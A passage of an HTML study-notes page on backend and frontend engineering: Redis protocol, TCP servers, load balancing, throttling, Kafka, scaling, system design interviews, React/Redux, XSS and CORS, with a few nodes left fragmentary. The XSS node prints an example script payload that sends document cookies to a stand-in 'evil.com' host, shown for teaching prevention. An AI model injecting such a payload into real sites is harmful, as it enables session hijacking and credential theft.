  Server pre-allocates buffer of exactly N bytes → single read() call.</pre>
<h3>Redis Command on the Wire</h3>
<pre>
  SET key value  →  *3\r\n          (3 elements)
                    $3\r\nSET\r\n   (bulk string "SET")
                    $3\r\nkey\r\n   (bulk string "key")
                    $5\r\nvalue\r\n (bulk string "value")</pre>
</template>

<template id="node-06-09" data-type="node" data-trail="trail-06" data-order="9"
  data-title="TCP Echo Server Implementation"
  data-file="Redis/TCP Echo Server Implementation.md"
  data-bridge="The TCP echo server made the single-threaded blocking model concrete — Redis sidesteps concurrency by processing one command at a time on a single event loop. Traditional relational databases take the opposite approach: they serve concurrent clients, which forces them to coordinate conflicting reads and writes through transactions. This node covers the full machinery — ACID guarantees, isolation levels from read committed to serializable, and the three implementation strategies for achieving true serializability.">
<h3>The Blocking Bottleneck</h3>
<pre>
  func main() {
      listener, _ := net.Listen("tcp", ":6379")
      for {
          conn, _ := listener.Accept()  ← BLOCKS until a client connects
          handleClient(conn)             ← BLOCKS until this client disconnects
      }
  }

  func handleClient(conn) {
      for {
          cmd, _ := readCommand(conn)  ← BLOCKS waiting for client to send data
          conn.Write(cmd)
      }
  }</pre>
<h3>Why Client 2 Can Never Connect</h3>
<pre>
  t=0  Client 1 connects → listener.Accept() returns
  t=0  Server enters handleClient(client1) → stuck in inner loop
  t=0  Client 2 tries to connect
       ↓
  t=∞  Server never reaches listener.Accept() again
       (blocked inside handleClient(client1))
       ↓
  t=∞  Client 2 waits forever ✗

  While Client 1 is connected but NOT sending data:
    readCommand(client1) is BLOCKING
    Server CPU is idle but completely unavailable</pre>
<h3>What This Motivates</h3>
<div class="compare">
  <div><h4>Naive single-threaded</h4><pre>Accept 1 connection
Block waiting for its data
Handle it, then next client
Handles 1 client at a time ✗</pre></div>
  <div><h4>IO Multiplexing (Redis)</h4><pre>Accept ALL connections
Ask OS: which have data?
Handle only READY ones
Thousands of clients ✓</pre></div>
</div>
<ul>
  <li>Socket lifecycle: <code>socket()</code> → <code>bind(port)</code> → <code>listen()</code> → <code>accept()</code> → <code>read()</code> → <code>write()</code> → <code>close()</code></li>
  <li>This exercise makes Redis's <code>epoll</code>-based design feel concrete — <code>epoll</code> is the non-blocking version of this blocking pattern</li>
  <li>A real Redis handles 50,000+ concurrent connections; this naive server handles exactly 1</li>
</ul>
</template>

<template id="node-07-01" data-type="node" data-trail="trail-07" data-order="1"
  data-title="Load Balancer"
  data-file="Scaling/Load Balancer.md"
  data-bridge="The load balancer is the first piece of scaling infrastructure. But modern architectures add a second layer: the API gateway. This note draws the exact distinction — network-level distribution vs application-level concerns.">
<h3>Without vs With Load Balancer</h3>
<div class="compare">
  <div><h4>Without LB</h4><pre>Internet
    │
    ▼
Single Server
(maxed out)</pre></div>
  <div><h4>With LB</h4><pre>Internet
    │
    ▼
Load Balancer
┌───┼───┐
S1  S2  S3
(all share DB)</pre></div>
</div>
<h3>Three Algorithms</h3>
<table>
  <thead><tr><th>Algorithm</th><th>How</th><th>Best for</th></tr></thead>
  <tbody>
    <tr><td>Round Robin</td><td>Requests rotated sequentially</td><td>Homogeneous servers, uniform requests</td></tr>
    <tr><td>Least Connections</td><td>Route to server with fewest active connections</td><td>Requests vary in cost (some 10ms, some 2s)</td></tr>
    <tr><td>IP Hash</td><td>Route based on client IP hash</td><td>Sticky sessions (stateful servers)</td></tr>
  </tbody>
</table>
<h3>Layer 4 vs Layer 7</h3>
<table>
  <thead><tr><th></th><th>Layer 4 (Transport)</th><th>Layer 7 (Application)</th></tr></thead>
  <tbody>
    <tr><td>Works at</td><td>TCP/UDP level</td><td>HTTP level</td></tr>
    <tr><td>Routing decision</td><td>Source/dest IP + port</td><td>URL path, headers, cookies</td></tr>
    <tr><td>Performance</td><td>Faster (no HTTP parsing)</td><td>Slower (must parse HTTP)</td></tr>
    <tr><td>Example</td><td>AWS NLB</td><td>AWS ALB, Nginx</td></tr>
  </tbody>
</table>
<ul>
  <li>LB continuously pings servers (health checks); unhealthy server removed from rotation</li>
  <li>Can trigger auto-scaling: CPU &gt; 80% → add server; CPU &lt; 20% → remove server</li>
</ul>
<h3>Why Not Expose the App Server Directly?</h3>
<table>
  <thead><tr><th>Risk</th><th>What goes wrong without an LB</th></tr></thead>
  <tbody>
    <tr><td>Single point of failure</td><td>One server, one outage — no failover</td></tr>
    <tr><td>No health-aware routing</td><td>Dead server stays in traffic path until a human notices</td></tr>
    <tr><td>Can't scale horizontally</td><td>Stuck with DNS round-robin: slow to propagate, cached by resolvers, health-blind</td></tr>
    <tr><td>No zero-downtime deploys</td><td>No rotation to drain — every deploy drops live connections</td></tr>
    <tr><td>Bigger attack surface</td><td>No edge layer to absorb DDoS/SYN floods/slowloris or apply WAF + rate limits</td></tr>
    <tr><td>Resource exhaustion</td><td>Every raw connection (retries, bots, slow clients) hits the app's thread pool directly</td></tr>
    <tr><td>Topology exposed</td><td>Server's IP becomes the public contract — can't resize/replace/re-IP freely</td></tr>
  </tbody>
</table>
<div class="warn">The LB is the resilience + security boundary between unpredictable internet traffic and app logic — skip it and every client is coupled directly to one fragile, exposed machine.</div>
</template>

<template id="node-07-02" data-type="node" data-trail="trail-07" data-order="2"
  data-title="Load Balancer vs API Gateway"
  data-file="Load Balancer vs API Gateway.md"
  data-bridge="With both traffic-distribution layers understood, the next concern is rate control: protecting services from traffic spikes and abuse. Throttling strategies and where to enforce them.">
<h3>The Distinction</h3>
<div class="compare">
  <div><h4>Load Balancer</h4><p>Concern: <strong>WHERE</strong> to send traffic</p><ul><li>Distribute by health/load</li><li>Health checks</li><li>SSL termination</li><li>Sticky sessions</li></ul></div>
  <div><h4>API Gateway</h4><p>Concern: <strong>WHAT</strong> to do with the request</p><ul><li>Authentication / JWT validation</li><li>Rate limiting / throttling</li><li>Request transformation</li><li>API versioning + routing</li><li>Logging + analytics</li></ul></div>

  Pattern 2: CDN + LB + API Gateway (full stack)

<template id="node-07-03" data-type="node" data-trail="trail-07" data-order="3"
  data-title="API Throttling"
  data-file="Scaling/API Throttling.md"
  data-bridge="Rate limiting protects your origin servers; CDNs reduce how often requests reach them at all. This note covers how edge networks cache content, terminate TLS close to users, and absorb traffic at global scale.">
<h3>Token Bucket (Burst Handling)</h3>
<pre>
  Bucket capacity: 100 tokens
  Refill rate: 10 tokens/sec

  Burst of 100 requests → all allowed (bucket had 100)
  101st request → 429 Too Many Requests (bucket empty)
  Wait 1 second → 10 tokens refill → 10 more allowed

  Allows short bursts while enforcing long-term rate ✓</pre>
<h3>Strategy Types</h3>
<table>
  <thead><tr><th>Strategy</th><th>How</th><th>Use for</th></tr></thead>
  <tbody>
    <tr><td>Rate limiting</td><td>Max N requests per time window</td><td>Per-user/IP protection</td></tr>
    <tr><td>Quota limiting</td><td>Max N requests per day/month</td><td>API pricing tiers</td></tr>
    <tr><td>Token bucket</td><td>Tokens refill at steady rate</td><td>Allow bursts, enforce average</td></tr>
  </tbody>
</table>
<h3>Where to Enforce</h3>
<table>
  <thead><tr><th>Layer</th><th>How</th><th>Best for</th></tr></thead>
  <tbody>
    <tr><td>API Gateway</td><td>Before request hits your code</td><td>Centralised, no app changes</td></tr>
    <tr><td>Application code</td><td>DRF throttle classes, <code>slowapi</code></td><td>Per-endpoint granularity</td></tr>
    <tr><td>Redis-backed counters</td><td><code>INCR</code> + <code>EXPIRE</code> per user/IP</td><td>Distributed horizontally-scaled apps</td></tr>
  </tbody>
</table>
</template>

<template id="node-07-04" data-type="node" data-trail="trail-07" data-order="4"
  data-title="CDN Concepts and AWS CloudFront"
  data-file="CDN Concepts &amp; AWS CloudFront Developer Flow.md"

Origin server</pre></div>

Edge server in Sydney

  <tbody>

    <tr><td>Versioned URLs</td><td><code>/app.v3.js</code> — cached forever</td><td>JS/CSS bundles with content hash</td></tr>

  </tbody>

</template>

<template id="node-07-05" data-type="node" data-trail="trail-07" data-order="5"
  data-title="Kafka: Distributed Messaging System"
  data-file="Kafka Distributed Messaging System (Video Summary).md"
  data-bridge="With every scaling layer understood individually, this note assembles them at extreme scale — 1M RPS benchmarks, framework ceilings, the Redis write-behind pattern, and why network cards become the final bottleneck.">
<h3>Architecture</h3>
<pre>
  PRODUCERS → BROKERS (Kafka servers) → CONSUMERS
  ─────────────────────────────────────────────────────────
  Producer A ──┐                         ┌──► Consumer Group 1
  Producer B ──┼──► Topic "orders"       │        ├── Consumer 1 (Partition 0)
               │      ├── Partition 0 ───┤        └── Consumer 2 (Partition 1)
               │      └── Partition 1 ───┘
               │    (each partition = ordered, append-only log)
  Messages stored on broker for configurable retention (2+ weeks default).
  Consumers PULL; track progress via OFFSET.</pre>
<h3>Consumer Groups → Exactly-Once</h3>
<pre>
  Topic "orders", Consumer Group A:
  Partition 0 ──► Consumer 1 (exclusively)
  Partition 1 ──► Consumer 2 (exclusively)
  ONE partition → ONE consumer within a group
  → prevents duplicate processing ✓</pre>
<h3>Delivery Guarantees</h3>
<table>
  <thead><tr><th>Guarantee</th><th>ACK when</th><th>Risk</th></tr></thead>
  <tbody>
    <tr><td>At-most-once</td><td>Before processing</td><td>Messages lost on crash</td></tr>
    <tr><td>At-least-once</td><td>After processing</td><td>Duplicates possible</td></tr>
    <tr><td>Exactly-once</td><td>Via consumer groups + idempotent producers</td><td>Complex setup</td></tr>
  </tbody>
</table>
<h3>Performance Optimisations</h3>
<ul>
  <li><strong>Batching</strong>: producers batch messages (up to 50 KB); consumers batch-fetch. Reduces network round-trips.</li>
  <li><strong>Zero-copy</strong>: disk → kernel buffer → NIC directly (skips user-space copy). ~2× faster, lower memory, avoids Java GC pressure.</li>
  <li>LinkedIn processes 7 trillion messages per day</li>
  <li>Ordering guaranteed within one partition; not across partitions</li>
</ul>
</template>

<template id="node-07-06" data-type="node" data-trail="trail-07" data-order="6"
  data-title="Handling 1 Million Requests Per Second"
  data-file="Scaling/Handling 1M Requests.md"
  data-bridge="The 1M RPS case study shows the ceiling; this note covers the general toolkit — connection pooling, profiling, caching — for the more common task of improving performance before you hit that ceiling.">
<h3>Managed API Costs at Scale</h3>
<table>
  <thead><tr><th>Provider</th><th>Est. cost at 1M RPS/month</th></tr></thead>
  <tbody>
    <tr><td>OpenWeather API</td><td>~$3.8 Billion</td></tr>
    <tr><td>Amazon API calls</td><td>~$3.9 Million</td></tr>
    <tr><td>Cloudflare Workers</td><td>~$1 Million</td></tr>
    <tr><td>Self-managed AWS C8GN (192 cores, 600 Gbps)</td><td>~$8,000 ✓</td></tr>
  </tbody>
</table>
<h3>Scaling Tiers</h3>
<pre>
  Tier 1: Single node
    Express ~20K RPS  |  Fastify/Cpeak ~77K  |  C++ Drogon ~1.2M

  Tier 2: Multiple workers (PM2 / Uvicorn --workers)
    1 worker per CPU core → 128 cores = 128 parallel processes

  Tier 3: Redis in-memory layer
    PostgreSQL: ~1K writes/sec (disk I/O limit)
    Redis single: ~100-150K ops/sec
    Redis Cluster (30 nodes): ~1M writes/sec

  Tier 4: Language + hardware
    C++ for compute-critical paths
    100+ Gbps NIC (30KB × 1M RPS = 38 GB/s network traffic)</pre>
<h3>Write-Behind Pattern</h3>
<pre>
  Problem: PostgreSQL can't handle 1M writes/sec (disk I/O)

  Step 1 — Ingest: client → write to Redis (RAM) → ACK immediately
  Step 2 — Queue:  Redis stores pending IDs in a list/set
  Step 3 — Sync:   background worker drains Redis → batch INSERT to Postgres

  Redis absorbs 1M writes/sec in RAM.
  Postgres receives batched writes it can handle.</pre>
<h3>Memory vs Disk</h3>
<table>
  <thead><tr><th>Storage</th><th>Access latency</th><th>Throughput</th></tr></thead>
  <tbody>
    <tr><td>RAM</td><td>~100 ns</td><td>~50 GB/s</td></tr>
    <tr><td>NVMe SSD</td><td>~50,000 ns</td><td>~3 GB/s</td></tr>
    <tr><td>SATA SSD</td><td>~200,000 ns</td><td>~500 MB/s</td></tr>
  </tbody>
</table>
</template>

<template id="node-07-07" data-type="node" data-trail="trail-07" data-order="7"
  data-title="Performance Improvement Concepts"
  data-file="Performance Improvement Concepts.md"
  data-bridge="">
<h3>Connection Pooling</h3>
<div class="compare">
  <div><h4>Without pooling</h4><pre>Request → open DB connection
         → execute query
         → close DB connection
TCP handshake + auth per request
SLOW at scale ✗</pre></div>
  <div><h4>With pooling</h4><pre>App starts → 20 connections pre-created
Request → grab from pool
         → execute query
         → return to pool
Reuse existing connections ✓</pre></div>
</div>
<h3>Profiling: Find the Real Bottleneck</h3>
<table>
  <thead><tr><th>Type</th><th>What it finds</th><th>Tools</th></tr></thead>
  <tbody>
    <tr><td>CPU profiling</td><td>Which functions consume most CPU time</td><td>cProfile (Python), perf (Linux), node --prof</td></tr>
    <tr><td>Memory profiling</td><td>Allocations and leaks</td><td>memory_profiler (Python), heapdump (Node)</td></tr>
    <tr><td>DB profiling</td><td>Slow queries, missing indexes</td><td>EXPLAIN ANALYZE (Postgres), slow query log</td></tr>
    <tr><td>I/O profiling</td><td>File reads, network, disk bottlenecks</td><td>strace, iotop, network monitor</td></tr>
  </tbody>
</table>
<h3>General Performance Checklist</h3>
<table>
  <thead><tr><th>Layer</th><th>Lever</th><th>Impact</th></tr></thead>
  <tbody>
    <tr><td>DB queries</td><td>Add missing index</td><td>High — O(n) → O(log n)</td></tr>
    <tr><td>DB connections</td><td>Add connection pool</td><td>Medium — eliminates TCP overhead</td></tr>
    <tr><td>Repeated computation</td><td>Cache result (Redis / in-memory)</td><td>High — ms → µs</td></tr>
    <tr><td>External API calls</td><td>Batch + cache responses</td><td>High — reduce N calls to 1</td></tr>
    <tr><td>Static assets</td><td>CDN</td><td>High — reduce latency + origin load</td></tr>
    <tr><td>DB reads</td><td>Read replicas</td><td>High — split read load</td></tr>
  </tbody>
</table>
<div class="warn">Always profile first. Fix the actual bottleneck, not the assumed one.</div>
</template>

<template id="node-08-01" data-type="node" data-trail="trail-08" data-order="1"
  data-title="System Design Primer"
  data-file="System Design/System Design Primer.md"
  data-bridge="The primer gives you the vocabulary and estimation framework. The URL shortener is the canonical first case: simple enough to reason about fully, but it exercises every fundamental — hashing, caching, read replicas, and redirect trade-offs.">
<h3>Back-of-Envelope Estimation</h3>
<pre>
  1. Estimate DAU × actions/user/day = ops/day
     e.g. 100M DAU × 10 actions = 1B ops/day

  2. Convert to QPS: 1B / 86,400 ≈ 11,600 QPS

  3. Split read/write: 90/10 ratio typical
     Read QPS = 10,400  |  Write QPS = 1,160

  4. Storage: 10,000 new posts/day × 1 KB = 10 MB/day
     Over 5 years: 18 GB (trivial)</pre>
<h3>Leader-Follower for Read Scaling</h3>
<pre>
  Read-heavy system:

  Application:
    writes → Leader DB (replicates WAL → followers)
    reads  → Follower 1
    reads  → Follower 2

  Routing options:
    App code: DB_WRITE_URL + DB_READ_URL
    Aurora: writer endpoint + reader endpoint (AWS manages)
    PgBouncer / MySQL Router: proxy does splitting</pre>
<h3>Read-Your-Writes Problem</h3>
<pre>
  User creates post (write → leader)
  User immediately refreshes (read → stale follower)
  Post appears missing! ✗

  Fix: read user's OWN data from leader;
       others' data from followers.</pre>
<h3>Key Trade-offs to State in Interviews</h3>
<table>
  <thead><tr><th>Decision</th><th>Trade-off</th></tr></thead>
  <tbody>
    <tr><td>SQL vs NoSQL</td><td>Consistency + joins vs horizontal scale</td></tr>
    <tr><td>Sync vs async replication</td><td>Durability vs write latency</td></tr>
    <tr><td>Cache vs DB for hot data</td><td>Speed vs consistency</td></tr>
    <tr><td>Monolith vs microservices</td><td>Simplicity vs independent scaling</td></tr>
  </tbody>
</table>
</template>

<template id="node-08-02" data-type="node" data-trail="trail-08" data-order="2"
  data-title="Design URL Shortener"
  data-file="System Design/Design URL Shortner.md"
  data-bridge="URL shortener is a key-value lookup at scale. TikTok raises the complexity: video transcoding pipelines, CDN distribution, social graph queries, and personalized feed generation all arrive simultaneously.">
<h3>301 vs 302 — Critical Trade-off</h3>
<div class="compare">
  <div><h4>301 Moved Permanently</h4><pre>Browser CACHES the redirect
Future visits skip your server
Good: SEO
Bad: analytics (you lose hits)</pre></div>
  <div><h4>302 Found (Temporary)</h4><pre>Browser does NOT cache
Every visit hits your server
Good: analytics tracking ✓
Use this for URL shorteners</pre></div>
</div>
<h3>URL Generation Strategies</h3>
<table>
  <thead><tr><th>Strategy</th><th>How</th><th>Pro</th><th>Con</th></tr></thead>
  <tbody>
    <tr><td>Counter + Base62</td><td>Redis INCR → encode</td><td>No collisions</td><td>Counter = SPOF, guessable</td></tr>
    <tr><td>Random string</td><td>7 random Base62 chars</td><td>No SPOF</td><td>Rare collision check needed</td></tr>
    <tr><td>Hash</td><td>MD5/SHA-256 first 7 chars</td><td>Deterministic</td><td>Collision possible</td></tr>
  </tbody>
</table>
<div class="info">Base62 (0-9, a-z, A-Z): 62^7 = ~3.5 trillion combinations. For 5 billion URLs, collision probability is very low.</div>
<h3>Scaled Architecture</h3>
<pre>
  Internet → LB → URL Service → Postgres (indexed short_code)
                       │
                       └── Redis (hot URL cache)

  Read path (10K RPS):
    short_code → check Redis (80% hit rate)
    miss → query Postgres → write back to cache

  Analytics write path:
    increment → Redis (not Postgres directly!)
    background job: flush Redis counts to Postgres every 60s
    → avoids Postgres write per redirect</pre>
</template>

<template id="node-08-03" data-type="node" data-trail="trail-08" data-order="3"
  data-title="Design TikTok"
  data-file="System Design/Design TikTok.md"
  data-bridge="TikTok's challenge is read-heavy scale. Google Docs introduces a harder problem: multiple writers on the same document simultaneously, where Operational Transform must resolve conflicts in real time.">
<h3>Scale Estimation</h3>
<pre>
  1M DAU × 2 uploads/day × 5 MB = 10 TB/day new storage
  1M DAU × 30 views/day = 30M views/day → ~350 RPS reads</pre>
<h3>Architecture</h3>
<pre>
  ┌────────────────────────────────────────────────────────────┐
  │                         CLIENT                              │
  └────────────┬────────────────────────────┬───────────────────┘
               │ upload                      │ view feed
               ▼                             ▼
  ┌───────────────────┐   ┌─────────────────────────────────────┐
  │  Upload Service   │   │         Feed Service                │
  │  1. Accept video  │   │  1. Check Redis (user's top 10)     │
  │  2. Store → S3    │   │  2. Miss → query Postgres           │
  │  3. Meta → Postgres│  │  3. Precache service fills cache    │
  └───────────────────┘   └─────────────────────────────────────┘
         │                              │
         ▼                              ▼
  Async transcoding              CDN distributes videos</pre>
<h3>DB Schema</h3>
<pre>
  Users:        user_id, username, follower_count
  Videos:       video_id, user_id (FK), s3_url, caption, created_at
  UserActivity: activity_id, user_id (FK), video_id (FK), type (like/follow)</pre>
<h3>Scaling Strategies</h3>
<table>
  <thead><tr><th>Bottleneck</th><th>Mitigation</th></tr></thead>
  <tbody>
    <tr><td>Read-heavy feed</td><td>Redis cache + read replicas</td></tr>
    <tr><td>Viral video traffic</td><td>CDN caches popular videos at edge</td></tr>
    <tr><td>High write load</td><td>DB sharding by user_id or region</td></tr>
    <tr><td>Feed for power users (10M followers)</td><td>Fan-out on write vs fan-out on read trade-off</td></tr>
  </tbody>
</table>
</template>

<template id="node-08-04" data-type="node" data-trail="trail-08" data-order="4"
  data-title="Design Google Docs"
  data-file="System Design/Google Docs System Design – Interview Summary.md"
  data-bridge="">
<h3>Operational Transform — The Core Idea</h3>
<pre>
  String: "Hello!"
  User A (position 5): insert ","    → "Hello,!"
  User B (position 5): insert " world"

  Without OT: "Hello world,!" ✗ (wrong order)
  With OT: transform B's position: 5 → 6 (A inserted 1 char before)
  Result:  "Hello, world!" ✓

  Server is the source of truth for edit ordering.
  Clients apply OT locally for optimistic updates.</pre>
<h3>Architecture</h3>
<pre>
  ┌────────────────────────────────────────────────────────────┐
  │  Client A                          Client B                │
  └──────────────┬─────────────────────────┬───────────────────┘
                 │ WebSocket               │ WebSocket
                 ▼                         ▼
  ┌────────────────────────────────────────────────────────────┐
  │          WebSocket Service (STATEFUL!)                      │
  │  All users on same doc → same instance                     │
  │  Routing: consistent hashing by document_id               │
  └────────────────┬───────────────────────────────────────────┘
                   │
       ┌───────────┴────────────┐
       ▼                        ▼
  ┌──────────────┐   ┌────────────────────────────────────┐
  │ Object Store │   │ Cassandra (recent edits)           │
  │ S3 snapshots │   │ Heavy-write optimised              │
  └──────────────┘   └────────────────────────────────────┘</pre>
<h3>Hybrid Storage Strategy</h3>
<pre>
  User opens doc:
    1. Fetch base snapshot from Object Storage (via CDN)
    2. Fetch recent edits from Cassandra
    3. Apply edits locally → current state

  Room reaches 0 connections:
    1. Trigger compaction worker via message queue
    2. Apply edits → new snapshot in Object Storage
    3. Tombstone edits in Cassandra
    (keep tombstones for version history)</pre>
<h3>Client Optimisations</h3>
<table>
  <thead><tr><th>Optimisation</th><th>What it does</th></tr></thead>
  <tbody>
    <tr><td>Debouncing</td><td>Don't send every keystroke; batch edits</td></tr>
    <tr><td>Optimistic updates</td><td>Apply edit locally before server confirms</td></tr>
    <tr><td>OT vs CRDT</td><td>OT = ordered list algorithm; CRDT = auto-merge data types (Google may have migrated)</td></tr>
  </tbody>
</table>
</template>

<template id="node-10-01" data-type="node" data-trail="trail-10" data-order="1"
  data-title="SSG, SSR, and Edge Rendering"
  data-file="Frontend/SSG SSR Edge.md"
  data-bridge="The rendering strategy shapes every performance decision. React is the component model that powers most of those strategies — virtual DOM, hooks, and unidirectional data flow.">
<h3>Where Is HTML Generated?</h3>
<table>
  <thead><tr><th></th><th>Server Components</th><th>Client Components</th><th>Edge Functions</th></tr></thead>
  <tbody>
    <tr><td>Runs on</td><td>Server (before browser)</td><td>Browser (after page loads)</td><td>CDN edge node</td></tr>
    <tr><td>JS in browser</td><td>No</td><td>Yes</td><td>Yes (on CDN server)</td></tr>
    <tr><td>Best for</td><td>Static content, SEO, API calls</td><td>Interactivity, events</td><td>Real-time personalisation</td></tr>
    <tr><td>Performance</td><td>Fast (no hydration)</td><td>Slower (hydration needed)</td><td>Fastest (global CDN)</td></tr>
  </tbody>
</table>
<h3>Four Rendering Strategies</h3>
<pre>
  CSR (Client-Side):  empty HTML + JS bundle → browser builds DOM
                      First paint slow | SEO poor

  SSR (Server-Side):  server fetches data + builds HTML per request
                      First paint fast | SEO excellent | needs hydration

  SSG (Static):       HTML built ONCE at build time → served from CDN
                      Fastest possible | SEO excellent | stale on rebuild only

  Edge:               SSR runs at CDN edge (close to user)
                      Ultra-low latency + personalisation</pre>
<h3>Next.js APIs</h3>
<pre>
  SSG: export async function getStaticProps() { /* build time */ }
       export async function getStaticPaths() { /* dynamic routes */ }

  SSR: export async function getServerSideProps(context) { /* per request */ }

  App Router (modern): Server Components by default
  Add "use client" to opt into client component</pre>
</template>

<template id="node-10-02" data-type="node" data-trail="trail-10" data-order="2"
  data-title="React Basics"
  data-file="Frontend/React Basic Learnings.md"
  data-bridge="React handles local component state. When multiple components need shared state — or async operations like API calls need management — Redux provides the global immutable store and Redux-Saga handles the side effects.">
<h3>React's Core Model</h3>
<pre>
  UI = f(state)  ← React's fundamental idea

  Component is a function of its state and props.
  When state changes → React re-renders the component.
  Diffs new virtual DOM vs old → updates ONLY changed DOM nodes.</pre>
<h3>Virtual DOM Diffing</h3>
<div class="compare">
  <div><h4>Before click</h4><pre>Virtual DOM:
&lt;div&gt;
  &lt;button&gt;0&lt;/button&gt;
  &lt;p&gt;Hello&lt;/p&gt;
&lt;/div&gt;</pre></div>
  <div><h4>After click</h4><pre>Virtual DOM:
&lt;div&gt;
  &lt;button&gt;1&lt;/button&gt; ← changed
  &lt;p&gt;Hello&lt;/p&gt;       ← same
&lt;/div&gt;
React updates ONLY &lt;button&gt; ✓</pre></div>
</div>
<h3>Key Hooks</h3>
<table>
  <thead><tr><th>Hook</th><th>Purpose</th></tr></thead>
  <tbody>
    <tr><td><code>useState(init)</code></td><td>Local state; re-renders on change</td></tr>
    <tr><td><code>useEffect(fn, deps)</code></td><td>Side effects (fetch, subscriptions, timers)</td></tr>
    <tr><td><code>useCallback(fn, deps)</code></td><td>Memoises function reference (avoids child re-renders)</td></tr>
    <tr><td><code>useMemo(fn, deps)</code></td><td>Memoises computed value (expensive calculations)</td></tr>
    <tr><td><code>useRef(init)</code></td><td>Mutable value that doesn't trigger re-render; DOM refs</td></tr>
    <tr><td><code>useContext(ctx)</code></td><td>Read from React Context (lightweight global state)</td></tr>
  </tbody>
</table>
<ul>
  <li>Props are read-only for the child — parent passes callbacks to receive events from child</li>
  <li>Unidirectional data flow: data only flows parent → child; two-way is explicit, not automatic</li>
</ul>
</template>

<template id="node-10-03" data-type="node" data-trail="trail-10" data-order="3"
  data-title="React, Redux, and Redux-Saga"
  data-file="Frontend/React Redux Redux-Saga.md"
  data-bridge="With the application model complete, the final performance concern is delivery: how the JavaScript bundle reaches the browser. Code splitting, lazy loading, and bundle analysis determine actual time-to-interactive.">
<h3>Layer Architecture</h3>
<pre>
  ┌──────────────────────────────────┐
  │  React  (UI layer)               │
  └──────────────────┬───────────────┘
                     ↓ dispatch action
  ┌──────────────────────────────────┐
  │  Redux  (state layer)            │
  └──────────────────┬───────────────┘
                     ↓ action hits middleware
  ┌──────────────────────────────────┐
  │  Redux-Saga  (side effects)      │
  └──────────────────┬───────────────┘
                     ↓
  ┌──────────────────────────────────┐
  │  API / External Services         │
  └──────────────────────────────────┘</pre>
<h3>Complete Data Flow</h3>
<pre>
  User clicks button
    ↓ dispatch({ type: 'FETCH_USER', payload: userId })
  Saga middleware intercepts FETCH_USER
    ↓ spawns Worker Saga
  yield call(api.fetchUser, userId)  ← async API call
    ↓ API returns user
  yield put({ type: 'SET_USER', payload: user })
    ↓ Reducer handles SET_USER
  Redux store updates
    ↓ useSelector re-renders
  UI shows user data ✓</pre>
<h3>Watcher + Worker Pattern</h3>
<pre>
  // Watcher: listens for actions
  function* watchFetchUser() {
    yield takeEvery('FETCH_USER', fetchUserSaga);
  }
  // Worker: does the async work
  function* fetchUserSaga(action) {
    try {
      const user = yield call(api.fetchUser, action.payload);
      yield put({ type: 'SET_USER', payload: user });
    } catch (e) {
      yield put({ type: 'SET_ERROR', payload: e });
    }
  }</pre>
<h3>Storage Types</h3>
<table>
  <thead><tr><th>Storage</th><th>Persists after refresh?</th><th>Use for</th></tr></thead>
  <tbody>
    <tr><td>React state</td><td>No</td><td>Ephemeral UI state</td></tr>
    <tr><td>Redux store</td><td>No</td><td>Global app state</td></tr>
    <tr><td><code>localStorage</code></td><td>Yes (until cleared)</td><td>User preferences, auth token</td></tr>
    <tr><td><code>sessionStorage</code></td><td>No (tab close = gone)</td><td>Session-specific data</td></tr>
    <tr><td>Cookies</td><td>Configurable</td><td>Auth sessions, tracking</td></tr>
  </tbody>
</table>
</template>

<template id="node-11-01" data-type="node" data-trail="trail-11" data-order="1"
  data-title="XSS Attacks"
  data-file="Security/XSS Attacks.md"
  data-bridge="XSS shows what happens when browsers execute untrusted scripts. CORS is the complementary browser mechanism: the Same-Origin Policy and its controlled relaxation via HTTP headers that governs which cross-origin requests browsers allow.">
<h3>Three Types</h3>
<table>
  <thead><tr><th>Type</th><th>How</th><th>Real example</th></tr></thead>
  <tbody>
    <tr><td>Stored XSS</td><td>Script saved to DB; executes for all visitors</td><td>Samy Worm (2005) — spread to 1M MySpace profiles in 20 hrs</td></tr>
    <tr><td>Reflected XSS</td><td>Script in URL; victim must click malicious link</td><td>PayPal bug (2019) — session token stolen, $115K bounty</td></tr>
    <tr><td>DOM-based XSS</td><td>Client-side JS reads URL/hash → writes to DOM without escaping</td><td>Google Docs bug — executed via document URL fragment</td></tr>
  </tbody>
</table>
<h3>Attack Flow</h3>
<pre>
  1. Attacker finds unsanitised input
  2. Injects: &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;
  3. Victim loads page / clicks link
  4. Browser executes script
  5. Result: session hijacking, credential theft, worm propagation</pre>
<h3>Prevention Layers</h3>
<div class="good">
  <ul>
    <li><strong>Input sanitisation</strong> (server-side): strip/escape dangerous chars before storing — Python: <code>bleach</code>, <code>nh3</code>; Node: <code>sanitize-html</code></li>
    <li><strong>Output escaping</strong> (when rendering): escape HTML entities — <code>&lt; → &amp;lt;</code> — Django/Jinja2 auto-escape ✓; React auto-escapes JSX ✓</li>
    <li><strong>CSP headers</strong>: browser enforces <code>Content-Security-Policy: default-src 'self'</code> — blocks inline scripts even if injection succeeds</li>
    <li><strong>textContent over innerHTML</strong>: textContent never executes scripts</li>
  </ul>
</div>
<div class="warn">React's <code>dangerouslySetInnerHTML</code> bypasses auto-escaping — use only with sanitised content.</div>
</template>

<template id="node-11-02" data-type="node" data-trail="trail-11" data-order="2"
  data-title="CORS"
  data-file="Security/CORS.md"
  data-bridge="XSS and CORS are application-layer controls. MongoBleed shows a lower-level attack: a server-side memory disclosure vulnerability that requires no credentials — just an IP address and a malformed compressed packet.">
<h3>Why CORS Exists</h3>
<pre>
  SOP (Same-Origin Policy): page can only READ responses from same origin
  Origin = scheme + host + port

  Without SOP:
    You visit evil.com → JS calls bank.com API with your cookies
    → reads your balance → sends to attacker ✗

  CORS: controlled relaxation — servers explicitly say which origins are allowed.</pre>
<h3>Simple vs Preflight</h3>
<pre>
  SIMPLE REQUEST (direct, no preflight):
    Method: GET, HEAD, or POST
    No custom headers; Content-Type is safe list
    → Browser sends request + Origin header
    → Server must include Access-Control-Allow-Origin

  PREFLIGHT (OPTIONS first):
    Method: PUT, DELETE, PATCH  OR
    Custom headers (Authorization, X-Api-Key)  OR
    Content-Type: application/json

    Browser: OPTIONS /api/data
             Access-Control-Request-Method: POST
             Access-Control-Request-Headers: Authorization
    Server must respond with Allow-Origin, Allow-Methods, Allow-Headers
    Only then → browser sends actual request</pre>
<h3>Fix: Configure the Backend</h3>
<pre>
  Express:  app.use(cors({ origin: 'https://myapp.com' }));

  FastAPI:  app.add_middleware(CORSMiddleware,
                allow_origins=["https://myapp.com"],
                allow_headers=["Authorization"])

  Can't change backend? Use a PROXY:
    Browser → your proxy (same origin, no CORS) → external API</pre>
